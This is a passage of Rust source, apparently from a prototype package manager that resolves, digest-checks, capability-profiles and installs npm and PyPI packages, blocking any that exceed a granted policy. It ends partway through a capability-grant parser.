use std::collections::{BTreeMap, BTreeSet};
use std::fmt;
use std::fs;
use std::io::{Cursor, Read};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::str::FromStr;
use std::sync::OnceLock;

use flate2::read::GzDecoder;
use omc_cap::{Capability, Policy};
use omc_format::{BehaviorType, CapOp, Function, HttpRequest, Module, Op, Value, VirtualPath};
use omc_verify::{verify_module, VerifyFinding};
use reqwest::blocking::Client;
use semver::Version;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use tar::Archive;
use thiserror::Error;

pub type Result<T> = std::result::Result<T, OmcRegistryError>;

const LOCKFILE: &str = "omc.lock";
const MANIFEST: &str = "omc.toml";
const ARTIFACT_SCHEMA: u32 = 1;
const MAX_FILE_BYTES: u64 = 2 * 1024 * 1024;

#[derive(Debug, Error)]
pub enum OmcRegistryError {
    #[error("unsupported package spec `{0}`")]
    UnsupportedSpec(String),
    #[error("package version was not found: {0}")]
    PackageNotFound(String),
    #[error("blocked package `{spec}`; use --record-blocked to keep the artifact and lock entry")]
    BlockedPackage { spec: String },
    #[error("registry response did not include a downloadable artifact for {0}")]
    MissingArtifact(String),
    #[error("could not resolve a version for {name} matching `{requirement}`")]
    UnsatisfiedRequirement { name: String, requirement: String },
    #[error("install requires an accepted lockfile; blocked package remains: {0}")]
    BlockedLockedPackage(String),
    #[error("cannot install unsupported artifact type: {0}")]
    UnsupportedInstallArtifact(String),
    #[error("archive contains an unsafe path: {0}")]
    UnsafeArchivePath(String),
    #[error("downloaded artifact digest mismatch for {name}: expected {expected}, got {actual}")]
    DigestMismatch {
        name: String,
        expected: String,
        actual: String,
    },
    #[error("http error: {0}")]
    Http(#[from] reqwest::Error),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("json error: {0}")]
    Json(#[from] serde_json::Error),
    #[error("toml decode error: {0}")]
    TomlDecode(#[from] toml::de::Error),
    #[error("toml encode error: {0}")]
    TomlEncode(#[from] toml::ser::Error),
    #[error("zip error: {0}")]
    Zip(#[from] zip::result::ZipError),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Ecosystem {
    Npm,
    Pypi,
}

impl fmt::Display for Ecosystem {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Npm => f.write_str("npm"),
            Self::Pypi => f.write_str("pypi"),
        }
    }
}

impl FromStr for Ecosystem {
    type Err = OmcRegistryError;

    fn from_str(value: &str) -> Result<Self> {
        match value {
            "npm" => Ok(Self::Npm),
            "pypi" | "py" | "python" => Ok(Self::Pypi),
            _ => Err(OmcRegistryError::UnsupportedSpec(value.to_owned())),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageSpec {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: Option<String>,
    pub extras: BTreeSet<String>,
}

impl PackageSpec {
    fn new(ecosystem: Ecosystem, name: impl Into<String>, version: Option<String>) -> Self {
        Self {
            ecosystem,
            name: name.into(),
            version,
            extras: BTreeSet::new(),
        }
    }

    fn with_extras(
        ecosystem: Ecosystem,
        name: impl Into<String>,
        version: Option<String>,
        extras: BTreeSet<String>,
    ) -> Self {
        Self {
            ecosystem,
            name: name.into(),
            version,
            extras,
        }
    }

    pub fn parse(raw: &str) -> Result<Self> {
        let (ecosystem, rest) = raw
            .split_once(':')
            .ok_or_else(|| OmcRegistryError::UnsupportedSpec(raw.to_owned()))?;
        let ecosystem = Ecosystem::from_str(ecosystem)?;

        match ecosystem {
            Ecosystem::Npm => parse_npm_spec(raw, rest),
            Ecosystem::Pypi => parse_pypi_spec(rest),
        }
    }

    pub fn package_key(&self) -> String {
        format!("{}:{}", self.ecosystem, self.name_with_extras())
    }

    fn constraint_key(&self) -> String {
        format!("{}:{}", self.ecosystem, self.name)
    }

    pub fn requested(&self) -> String {
        match &self.version {
            Some(version) => format!("{}:{}@{}", self.ecosystem, self.name_with_extras(), version),
            None => self.package_key(),
        }
    }

    fn name_with_extras(&self) -> String {
        if self.ecosystem == Ecosystem::Pypi && !self.extras.is_empty() {
            format!(
                "{}[{}]",
                self.name,
                self.extras.iter().cloned().collect::<Vec<_>>().join(",")
            )
        } else {
            self.name.clone()
        }
    }
}

fn parse_npm_spec(raw: &str, rest: &str) -> Result<PackageSpec> {
    if rest.is_empty() {
        return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
    }

    let version_at = if let Some(stripped) = rest.strip_prefix('@') {
        stripped.rfind('@').map(|index| index + 1)
    } else {
        rest.rfind('@')
    };

    let (name, version) = match version_at {
        Some(index) => (&rest[..index], Some(rest[index + 1..].to_owned())),
        None => (rest, None),
    };

    if name.is_empty() || version.as_deref() == Some("") {
        return Err(OmcRegistryError::UnsupportedSpec(raw.to_owned()));
    }

    Ok(PackageSpec::new(Ecosystem::Npm, name, version))
}

fn parse_pypi_spec(rest: &str) -> Result<PackageSpec> {
    let (name, version) = if let Some((name, version)) = rest.split_once("==") {
        (name, Some(version.to_owned()))
    } else if let Some((name, version)) = rest.rsplit_once('@') {
        (name, Some(version.to_owned()))
    } else {
        return parse_pypi_requirement(rest)
            .ok_or_else(|| OmcRegistryError::UnsupportedSpec(rest.to_owned()));
    };

    let (name, extras) = parse_pypi_name_and_extras(name);

    if name.is_empty() || version.as_deref() == Some("") {
        return Err(OmcRegistryError::UnsupportedSpec(rest.to_owned()));
    }

    Ok(PackageSpec::with_extras(
        Ecosystem::Pypi,
        name,
        version,
        extras,
    ))
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OmcManifest {
    pub project: ProjectInfo,
    #[serde(default)]
    pub dependencies: BTreeMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectInfo {
    pub name: String,
    pub version: String,
}

impl OmcManifest {
    pub fn new(name: impl Into<String>) -> Self {
        Self {
            project: ProjectInfo {
                name: name.into(),
                version: "0.1.0".to_owned(),
            },
            dependencies: BTreeMap::new(),
        }
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct OmcLock {
    pub version: u32,
    #[serde(default)]
    pub packages: Vec<LockedPackage>,
}

impl OmcLock {
    pub fn new() -> Self {
        Self {
            version: 1,
            packages: Vec::new(),
        }
    }

    fn upsert(&mut self, package: LockedPackage) {
        if let Some(existing) = self.packages.iter_mut().find(|entry| {
            entry.ecosystem == package.ecosystem
                && entry.name == package.name
                && entry.version == package.version
        }) {
            *existing = package;
        } else {
            self.packages.push(package);
            self.packages.sort_by(|left, right| {
                (
                    left.ecosystem,
                    left.name.as_str(),
                    left.version.as_str(),
                    left.sha256.as_str(),
                )
                    .cmp(&(
                        right.ecosystem,
                        right.name.as_str(),
                        right.version.as_str(),
                        right.sha256.as_str(),
                    ))
            });
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LockedPackage {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: String,
    pub source_url: String,
    pub archive: String,
    pub artifact: String,
    pub sha256: String,
    pub behavior: Behavior,
    pub verdict: Verdict,
    #[serde(default)]
    pub dependencies: Vec<String>,
    #[serde(default)]
    pub grants: Vec<String>,
    #[serde(default)]
    pub capabilities: Vec<CapabilityFinding>,
    #[serde(default)]
    pub verifier_findings: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Behavior {
    Pure,
    HostCapability,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Verdict {
    Accepted,
    Blocked,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct CapabilityFinding {
    pub kind: CapabilityKind,
    pub target: String,
    pub source: String,
    pub evidence: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CapabilityKind {
    EnvRead,
    FsRead,
    FsWrite,
    HttpRequest,
    ProcSpawn,
    DynamicEval,
}

impl fmt::Display for CapabilityKind {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::EnvRead => f.write_str("env_read"),
            Self::FsRead => f.write_str("fs_read"),
            Self::FsWrite => f.write_str("fs_write"),
            Self::HttpRequest => f.write_str("http_request"),
            Self::ProcSpawn => f.write_str("proc_spawn"),
            Self::DynamicEval => f.write_str("dynamic_eval"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OmcArtifact {
    pub schema: u32,
    pub package: ArtifactPackage,
    pub source_url: String,
    pub source_sha256: String,
    pub compiler: String,
    pub behavior: Behavior,
    pub verdict: Verdict,
    pub grants: Vec<String>,
    pub dependencies: Vec<String>,
    pub files_scanned: usize,
    pub capabilities: Vec<CapabilityFinding>,
    pub verifier_findings: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArtifactPackage {
    pub ecosystem: Ecosystem,
    pub name: String,
    pub version: String,
}

#[derive(Debug, Clone)]
pub struct LinkOptions {
    pub project_dir: PathBuf,
    pub record_blocked: bool,
    pub allowed_capabilities: Vec<Capability>,
    pub constraints: BTreeMap<String, String>,
}

impl LinkOptions {
    pub fn new(project_dir: impl Into<PathBuf>) -> Self {
        Self {
            project_dir: project_dir.into(),
            record_blocked: false,
            allowed_capabilities: Vec::new(),
            constraints: BTreeMap::new(),
        }
    }
}

#[derive(Debug, Clone)]
pub struct LinkReport {
    pub locked: LockedPackage,
    pub artifact: OmcArtifact,
    pub lockfile: PathBuf,
    pub manifest: PathBuf,
}

#[derive(Debug, Clone, Default)]
pub struct InstallReport {
    pub npm_packages: usize,
    pub pypi_packages: usize,
    pub npm_bins: usize,
    pub python_scripts: usize,
    pub node_modules: PathBuf,
    pub npm_bin_dir: PathBuf,
    pub python_site_packages: PathBuf,
    pub python_bin_dir: PathBuf,
}

#[derive(Debug, Clone, Default)]
pub struct ProjectRequirements {
    pub specs: Vec<PackageSpec>,
    pub constraints: BTreeMap<String, String>,
}

#[derive(Debug, Clone)]
struct ResolvedPackage {
    ecosystem: Ecosystem,
    name: String,
    version: String,
    source_url: String,
    filename: String,
    expected_sha256: Option<String>,
    npm_scripts: BTreeMap<String, String>,
    dependencies: Vec<PackageSpec>,
}

pub fn init_project(project_dir: impl AsRef<Path>, name: Option<&str>) -> Result<PathBuf> {
    let project_dir = project_dir.as_ref();
    fs::create_dir_all(project_dir.join(".omc"))?;

    let manifest_path = project_dir.join(MANIFEST);
    if !manifest_path.exists() {
        let project_name = name.map(str::to_owned).unwrap_or_else(|| {
            project_dir
                .file_name()
                .and_then(|name| name.to_str())
                .unwrap_or("omc-project")
                .to_owned()
        });
        let manifest = OmcManifest::new(project_name);
        fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    }

    let lockfile_path = project_dir.join(LOCKFILE);
    if !lockfile_path.exists() {
        fs::write(&lockfile_path, toml::to_string_pretty(&OmcLock::new())?)?;
    }

    Ok(manifest_path)
}

pub fn link_package(spec: &PackageSpec, options: &LinkOptions) -> Result<LinkReport> {
    init_project(&options.project_dir, None)?;

    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
    let (report, _) = link_package_inner(&client, spec, options, true)?;
    Ok(report)
}

pub fn add_package_graph(spec: &PackageSpec, options: &LinkOptions) -> Result<Vec<LinkReport>> {
    init_project(&options.project_dir, None)?;

    let client = Client::builder().user_agent("omc-prototype/0.1").build()?;
    let mut reports = Vec::new();
    let mut seen = BTreeSet::new();
    add_package_graph_inner(&client, spec, options, &mut seen, &mut reports)?;

    if let Some(root) = reports.first() {
        write_manifest_dependency(&options.project_dir, spec, &root.locked.version)?;
    }

    Ok(reports)
}

pub fn install_project(options: &LinkOptions) -> Result<InstallReport> {
    init_project(&options.project_dir, None)?;

    let mut options = options.clone();
    let manifest = read_manifest(options.project_dir.join(MANIFEST))?;
    let mut specs = Vec::new();
    for (key, version) in manifest.dependencies {
        specs.push(PackageSpec::parse(&format!("{key}@{version}"))?);
    }
    let discovered = discover_project_requirements(&options.project_dir)?;
    specs.extend(discovered.specs);
    options.constraints.extend(discovered.constraints);

    let mut seen_roots = BTreeSet::new();
    for spec in specs {
        if !seen_roots.insert(spec.requested()) {
            continue;
        }
        add_package_graph(&spec, &options)?;
    }

    install_locked_packages(&options.project_dir)
}

pub fn discover_project_specs(project_dir: impl AsRef<Path>) -> Result<Vec<PackageSpec>> {
    Ok(discover_project_requirements(project_dir)?.specs)
}

pub fn discover_project_requirements(project_dir: impl AsRef<Path>) -> Result<ProjectRequirements> {
    let project_dir = project_dir.as_ref();
    let mut project = ProjectRequirements::default();

    let package_json = project_dir.join("package.json");
    if package_json.exists() {
        project
            .specs
            .extend(read_package_json_specs(&package_json)?);
    }

    let requirements_txt = project_dir.join("requirements.txt");
    if requirements_txt.exists() {
        let requirements = read_requirements_file(&requirements_txt)?;
        project.specs.extend(requirements.specs);
        project.constraints.extend(requirements.constraints);
    }

    Ok(project)
}

fn add_package_graph_inner(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
    seen: &mut BTreeSet<String>,
    reports: &mut Vec<LinkReport>,
) -> Result<()> {
    let (report, dependencies) = link_package_inner(client, spec, options, false)?;
    let resolved_key = format!(
        "{}:{}@{}",
        report.locked.ecosystem,
        spec.name_with_extras(),
        report.locked.version
    );

    if !seen.insert(resolved_key) {
        return Ok(());
    }

    reports.push(report);

    for dependency in dependencies {
        add_package_graph_inner(client, &dependency, options, seen, reports)?;
    }

    Ok(())
}

fn link_package_inner(
    client: &Client,
    spec: &PackageSpec,
    options: &LinkOptions,
    update_manifest: bool,
) -> Result<(LinkReport, Vec<PackageSpec>)> {
    let resolved = resolve_package(client, spec, options)?;
    let archive_bytes = download_artifact(client, &resolved)?;
    let sha256 = sha256_hex(&archive_bytes);

    if let Some(expected) = &resolved.expected_sha256 {
        if !expected.eq_ignore_ascii_case(&sha256) {
            return Err(OmcRegistryError::DigestMismatch {
                name: resolved.name.clone(),
                expected: expected.clone(),
                actual: sha256,
            });
        }
    }

    let archive_path = cache_archive(&options.project_dir, &resolved, &sha256, &archive_bytes)?;
    let profile = profile_archive(&resolved, &archive_bytes)?;
    let module = module_from_profile(&resolved, &profile.capabilities);
    let policy = options
        .allowed_capabilities
        .iter()
        .cloned()
        .fold(Policy::pure(), Policy::allow_capability);
    let verification = verify_module(&module, &policy);
    let verifier_findings = verification
        .err()
        .map(|error| {
            error
                .findings
                .into_iter()
                .map(render_verify_finding)
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    let verdict = if verifier_findings.is_empty() {
        Verdict::Accepted
    } else {
        Verdict::Blocked
    };
    let behavior = if profile.capabilities.is_empty() {
        Behavior::Pure
    } else {
        Behavior::HostCapability
    };

    let artifact = OmcArtifact {
        schema: ARTIFACT_SCHEMA,
        package: ArtifactPackage {
            ecosystem: resolved.ecosystem,
            name: resolved.name.clone(),
            version: resolved.version.clone(),
        },
        source_url: resolved.source_url.clone(),
        source_sha256: sha256.clone(),
        compiler: "omc-prototype-source-profiler".to_owned(),
        behavior,
        verdict,
        grants: options
            .allowed_capabilities
            .iter()
            .map(ToString::to_string)
            .collect(),
        dependencies: resolved
            .dependencies
            .iter()
            .map(PackageSpec::requested)
            .collect(),
        files_scanned: profile.files_scanned,
        capabilities: profile.capabilities,
        verifier_findings: verifier_findings.clone(),
    };
    let artifact_path = write_artifact(&options.project_dir, &resolved, &artifact)?;

    let locked = LockedPackage {
        ecosystem: resolved.ecosystem,
        name: resolved.name.clone(),
        version: resolved.version.clone(),
        source_url: resolved.source_url.clone(),
        archive: relative_path(&options.project_dir, &archive_path),
        artifact: relative_path(&options.project_dir, &artifact_path),
        sha256,
        behavior,
        verdict,
        dependencies: artifact.dependencies.clone(),
        grants: artifact.grants.clone(),
        capabilities: artifact.capabilities.clone(),
        verifier_findings,
    };

    if locked.verdict == Verdict::Blocked && !options.record_blocked {
        return Err(OmcRegistryError::BlockedPackage {
            spec: spec.requested(),
        });
    }

    if update_manifest {
        write_manifest_dependency(&options.project_dir, spec, &resolved.version)?;
    }

    let lockfile = options.project_dir.join(LOCKFILE);
    let mut lock = read_lockfile(&lockfile)?;
    lock.upsert(locked.clone());
    fs::write(&lockfile, toml::to_string_pretty(&lock)?)?;

    let manifest_path = options.project_dir.join(MANIFEST);
    Ok((
        LinkReport {
            locked,
            artifact,
            lockfile,
            manifest: manifest_path,
        },
        resolved.dependencies,
    ))
}

fn write_manifest_dependency(project_dir: &Path, spec: &PackageSpec, version: &str) -> Result<()> {
    let manifest_path = project_dir.join(MANIFEST);
    let mut manifest = read_manifest(&manifest_path)?;
    manifest
        .dependencies
        .insert(spec.package_key(), version.to_owned());
    fs::write(&manifest_path, toml::to_string_pretty(&manifest)?)?;
    Ok(())
}

pub fn read_lockfile(path: impl AsRef<Path>) -> Result<OmcLock> {
    let path = path.as_ref();
    if !path.exists() {
        return Ok(OmcLock::new());
    }
    Ok(toml::from_str(&fs::read_to_string(path)?)?)
}

pub fn read_manifest(path: impl AsRef<Path>) -> Result<OmcManifest> {
    let path = path.as_ref();
    if !path.exists() {
        return Ok(OmcManifest::new("omc-project"));
    }
    Ok(toml::from_str(&fs::read_to_string(path)?)?)
}

fn read_package_json_specs(path: &Path) -> Result<Vec<PackageSpec>> {
    let package = serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(path)?)?;
    let mut specs = Vec::new();

    for dependencies in [
        package.dependencies,
        package.dev_dependencies,
        package.optional_dependencies,
        required_peer_dependencies(package.peer_dependencies, package.peer_dependencies_meta),
    ] {
        for (name, requirement) in dependencies {
            specs.push(PackageSpec::new(Ecosystem::Npm, name, Some(requirement)));
        }
    }

    Ok(specs)
}

fn required_peer_dependencies(
    peer_dependencies: BTreeMap<String, String>,
    peer_dependencies_meta: BTreeMap<String, NpmPeerDependencyMeta>,
) -> BTreeMap<String, String> {
    peer_dependencies
        .into_iter()
        .filter(|(name, _)| {
            !peer_dependencies_meta
                .get(name)
                .map(|meta| meta.optional)
                .unwrap_or(false)
        })
        .collect()
}

fn read_requirements_file(path: &Path) -> Result<ProjectRequirements> {
    let mut discovered = ProjectRequirements::default();
    read_requirements_file_inner(
        path,
        RequirementsMode::Install,
        &mut BTreeSet::new(),
        &mut discovered,
    )?;
    Ok(discovered)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
enum RequirementsMode {
    Install,
    Constraint,
}

#[derive(Debug, Clone)]
struct RequirementsInclude {
    path: String,
    mode: RequirementsMode,
}

fn read_requirements_file_inner(
    path: &Path,
    mode: RequirementsMode,
    seen: &mut BTreeSet<(RequirementsMode, PathBuf)>,
    discovered: &mut ProjectRequirements,
) -> Result<()> {
    let seen_key = fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
    if !seen.insert((mode, seen_key)) {
        return Ok(());
    }

    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    for raw_line in fs::read_to_string(path)?.lines() {
        let line = raw_line.split('#').next().unwrap_or_default().trim();
        if line.is_empty() {
            continue;
        }

        if let Some(include) = parse_requirements_include(line) {
            read_requirements_file_inner(
                &base_dir.join(include.path),
                include.mode,
                seen,
                discovered,
            )?;
            continue;
        }

        if line.starts_with('-') || line.contains("://") {
            continue;
        }

        if let Some(spec) = parse_pypi_requirement(line) {
            match mode {
                RequirementsMode::Install => discovered.specs.push(spec),
                RequirementsMode::Constraint => {
                    if let Some(version) = spec.version.clone() {
                        discovered
                            .constraints
                            .insert(spec.constraint_key(), version);
                    }
                }
            }
        }
    }
    Ok(())
}

pub fn install_locked_packages(project_dir: impl AsRef<Path>) -> Result<InstallReport> {
    let project_dir = project_dir.as_ref();
    let lock = read_lockfile(project_dir.join(LOCKFILE))?;
    let node_modules = project_dir.join("node_modules");
    let npm_bin_dir = node_modules.join(".bin");
    let python_site_packages = project_dir
        .join(".omc")
        .join("python")
        .join("site-packages");
    let python_bin_dir = project_dir.join(".omc").join("python").join("bin");
    fs::create_dir_all(&node_modules)?;
    fs::create_dir_all(&npm_bin_dir)?;
    fs::create_dir_all(&python_site_packages)?;
    fs::create_dir_all(&python_bin_dir)?;

    let mut report = InstallReport {
        npm_packages: 0,
        pypi_packages: 0,
        npm_bins: 0,
        python_scripts: 0,
        node_modules,
        npm_bin_dir,
        python_site_packages,
        python_bin_dir,
    };

    for package in &lock.packages {
        if package.verdict != Verdict::Accepted {
            return Err(OmcRegistryError::BlockedLockedPackage(format!(
                "{}:{}@{}",
                package.ecosystem, package.name, package.version
            )));
        }

        match package.ecosystem {
            Ecosystem::Npm => {
                report.npm_bins += install_npm_package(
                    project_dir,
                    package,
                    &report.node_modules,
                    &report.npm_bin_dir,
                )?;
                report.npm_packages += 1;
            }
            Ecosystem::Pypi => {
                report.python_scripts += install_pypi_package(
                    project_dir,
                    package,
                    &report.python_site_packages,
                    &report.python_bin_dir,
                )?;
                report.pypi_packages += 1;
            }
        }
    }

    install_nested_npm_dependencies(project_dir, &lock, &report.node_modules)?;

    Ok(report)
}

fn install_npm_package(
    project_dir: &Path,
    package: &LockedPackage,
    node_modules: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let target = install_npm_package_to(project_dir, package, node_modules)?;
    install_npm_bins(&target, &package.name, bin_dir)
}

fn install_npm_package_to(
    project_dir: &Path,
    package: &LockedPackage,
    node_modules: &Path,
) -> Result<PathBuf> {
    let archive_path = project_dir.join(&package.archive);
    let target = npm_install_target(node_modules, &package.name);
    if target.exists() {
        fs::remove_dir_all(&target)?;
    }
    fs::create_dir_all(&target)?;

    let bytes = fs::read(&archive_path)?;
    let decoder = GzDecoder::new(Cursor::new(bytes));
    let mut archive = Archive::new(decoder);
    for entry in archive.entries()? {
        let mut entry = entry?;
        let raw_path = entry.path()?.to_string_lossy().into_owned();
        let stripped = strip_first_path_component(Path::new(&raw_path))
            .ok_or_else(|| OmcRegistryError::UnsafeArchivePath(raw_path.clone()))?;
        let output = checked_join(&target, &stripped)?;

        if entry.header().entry_type().is_dir() {
            fs::create_dir_all(output)?;
        } else if entry.header().entry_type().is_file() {
            if let Some(parent) = output.parent() {
                fs::create_dir_all(parent)?;
            }
            entry.unpack(output)?;
        }
    }

    Ok(target)
}

fn install_nested_npm_dependencies(
    project_dir: &Path,
    lock: &OmcLock,
    node_modules: &Path,
) -> Result<()> {
    for package in lock
        .packages
        .iter()
        .filter(|package| package.ecosystem == Ecosystem::Npm)
    {
        let parent = npm_install_target(node_modules, &package.name);
        install_nested_npm_dependencies_for_package(
            project_dir,
            lock,
            &parent,
            package,
            &mut Vec::new(),
        )?;
    }

    Ok(())
}

fn install_nested_npm_dependencies_for_package(
    project_dir: &Path,
    lock: &OmcLock,
    installed_dir: &Path,
    package: &LockedPackage,
    stack: &mut Vec<String>,
) -> Result<()> {
    let key = format!("{}@{}", package.name, package.version);
    if stack.contains(&key) {
        return Ok(());
    }
    stack.push(key);

    let nested_node_modules = installed_dir.join("node_modules");
    for dependency in &package.dependencies {
        let Ok(spec) = PackageSpec::parse(dependency) else {
            continue;
        };
        if spec.ecosystem != Ecosystem::Npm {
            continue;
        }
        let Some(locked_dependency) = find_locked_npm_dependency(lock, &spec) else {
            continue;
        };
        let dependency_dir =
            install_npm_package_to(project_dir, locked_dependency, &nested_node_modules)?;
        install_nested_npm_dependencies_for_package(
            project_dir,
            lock,
            &dependency_dir,
            locked_dependency,
            stack,
        )?;
    }

    stack.pop();
    Ok(())
}

fn find_locked_npm_dependency<'a>(
    lock: &'a OmcLock,
    spec: &PackageSpec,
) -> Option<&'a LockedPackage> {
    let (_, requirement) = npm_registry_name_and_requirement(spec).ok()?;
    lock.packages
        .iter()
        .filter(|package| package.ecosystem == Ecosystem::Npm && package.name == spec.name)
        .filter(|package| {
            requirement
                .as_deref()
                .map(|requirement| npm_version_satisfies(&package.version, requirement))
                .unwrap_or(true)
        })
        .max_by(|left, right| compare_npm_versions(&left.version, &right.version))
}

fn install_pypi_package(
    project_dir: &Path,
    package: &LockedPackage,
    site_packages: &Path,
    bin_dir: &Path,
) -> Result<usize> {
    let archive_path = project_dir.join(&package.archive);
    if archive_path.extension().and_then(|ext| ext.to_str()) != Some("whl") {
        return Err(OmcRegistryError::UnsupportedInstallArtifact(
            archive_path.display().to_string(),
        ));
    }

    let reader = Cursor::new(fs::read(&archive_path)?);
    let mut archive = zip::ZipArchive::new(reader)?;
    let mut entry_points = Vec::new();
    for index in 0..archive.len() {
        let mut file = archive.by_index(index)?;
        let output = checked_join(site_packages, Path::new(file.name()))?;

        if file.is_dir() {
            fs::create_dir_all(output)?;
        } else {
            let name = file.name().to_owned();
            let mut bytes = Vec::new();
            file.read_to_end(&mut bytes)?;
            if let Some(parent) = output.parent() {
                fs::create_dir_all(parent)?;
            }
            fs::write(output, &bytes)?;

            if name.ends_with(".dist-info/entry_points.txt") {
                if let Ok(content) = String::from_utf8(bytes) {
                    entry_points.push(content);
                }
            }
        }
    }

    install_python_entry_points(&entry_points, bin_dir)
}

fn npm_install_target(node_modules: &Path, name: &str) -> PathBuf {
    if let Some((scope, package)) = name.split_once('/') {
        node_modules.join(scope).join(package)
    } else {
        node_modules.join(name)
    }
}

fn install_npm_bins(package_dir: &Path, package_name: &str, bin_dir: &Path) -> Result<usize> {
    let package_json = package_dir.join("package.json");
    if !package_json.exists() {
        return Ok(0);
    }

    let package =
        serde_json::from_str::<NpmInstalledPackageJson>(&fs::read_to_string(package_json)?)?;
    let Some(bin) = package.bin else {
        return Ok(0);
    };

    fs::create_dir_all(bin_dir)?;
    let bins = match bin {
        NpmBinField::String(path) => vec![(
            npm_default_bin_name(package.name.as_deref().unwrap_or(package_name)),
            path,
        )],
        NpmBinField::Map(map) => map.into_iter().collect(),
    };

    let mut installed = 0;
    for (name, relative) in bins {
        if !is_safe_script_name(&name) {
            continue;
        }
        let source = checked_join(package_dir, Path::new(&relative))?;
        if !source.exists() {
            continue;
        }
        let target = bin_dir.join(&name);
        remove_path_if_exists(&target)?;
        create_command_link(&source, &target)?;
        installed += 1;
    }

    Ok(installed)
}

fn install_python_entry_points(entry_points: &[String], bin_dir: &Path) -> Result<usize> {
    fs::create_dir_all(bin_dir)?;
    let mut installed = 0;

    for content in entry_points {
        for entry in parse_console_scripts(content) {
            if !is_safe_script_name(&entry.name) {
                continue;
            }
            let target = bin_dir.join(&entry.name);
            remove_path_if_exists(&target)?;
            fs::write(&target, python_entry_point_script(&entry))?;
            make_executable(&target)?;
            installed += 1;
        }
    }

    Ok(installed)
}

fn parse_console_scripts(content: &str) -> Vec<PythonEntryPoint> {
    let mut in_console_scripts = false;
    let mut entries = Vec::new();

    for raw_line in content.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if line.starts_with('[') && line.ends_with(']') {
            in_console_scripts = line == "[console_scripts]";
            continue;
        }
        if !in_console_scripts {
            continue;
        }

        let Some((name, target)) = line.split_once('=') else {
            continue;
        };
        let target = target.trim();
        let target = target.split('[').next().unwrap_or(target).trim();
        let Some((module, function)) = target.split_once(':') else {
            continue;
        };
        entries.push(PythonEntryPoint {
            name: name.trim().to_owned(),
            module: module.trim().to_owned(),
            function: function.trim().to_owned(),
        });
    }

    entries
}

fn python_entry_point_script(entry: &PythonEntryPoint) -> String {
    format!(
        r#"#!/usr/bin/env python3
import re
import sys
from {module} import {function}

if __name__ == "__main__":
    sys.argv[0] = re.sub(r"(-script\.pyw|\.exe)?$", "", sys.argv[0])
    sys.exit({function}())
"#,
        module = entry.module,
        function = entry.function
    )
}

fn npm_default_bin_name(package_name: &str) -> String {
    package_name
        .rsplit('/')
        .next()
        .unwrap_or(package_name)
        .to_owned()
}

fn is_safe_script_name(name: &str) -> bool {
    !name.is_empty()
        && !name.contains('/')
        && !name.contains('\\')
        && !name.contains(std::path::MAIN_SEPARATOR)
        && name != "."
        && name != ".."
}

fn remove_path_if_exists(path: &Path) -> Result<()> {
    match fs::symlink_metadata(path) {
        Ok(metadata) if metadata.is_dir() && !metadata.file_type().is_symlink() => {
            fs::remove_dir_all(path)?;
        }
        Ok(_) => {
            fs::remove_file(path)?;
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
        Err(error) => return Err(error.into()),
    }
    Ok(())
}

#[cfg(unix)]
fn create_command_link(source: &Path, target: &Path) -> Result<()> {
    std::os::unix::fs::symlink(source, target)?;
    Ok(())
}

#[cfg(not(unix))]
fn create_command_link(source: &Path, target: &Path) -> Result<()> {
    fs::write(
        target,
        format!("@echo off\r\nnode \"{}\" %*\r\n", source.display()),
    )?;
    Ok(())
}

#[cfg(unix)]
fn make_executable(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;

    let mut permissions = fs::metadata(path)?.permissions();
    permissions.set_mode(0o755);
    fs::set_permissions(path, permissions)?;
    Ok(())
}

#[cfg(not(unix))]
fn make_executable(_path: &Path) -> Result<()> {
    Ok(())
}

fn strip_first_path_component(path: &Path) -> Option<PathBuf> {
    let mut components = path.components();
    components.next()?;
    let stripped = components.as_path();
    (!stripped.as_os_str().is_empty()).then(|| stripped.to_path_buf())
}

fn checked_join(base: &Path, relative: &Path) -> Result<PathBuf> {
    if relative.is_absolute()
        || relative
            .components()
            .any(|component| matches!(component, std::path::Component::ParentDir))
    {
        return Err(OmcRegistryError::UnsafeArchivePath(
            relative.display().to_string(),
        ));
    }
    Ok(base.join(relative))
}

pub fn parse_capability_grant(value: &str) -> Result<Capability> {
    if value == "dynamic-eval" || value == "dynamic.eval" {
        return Ok(Capability::DynamicEval);
    }
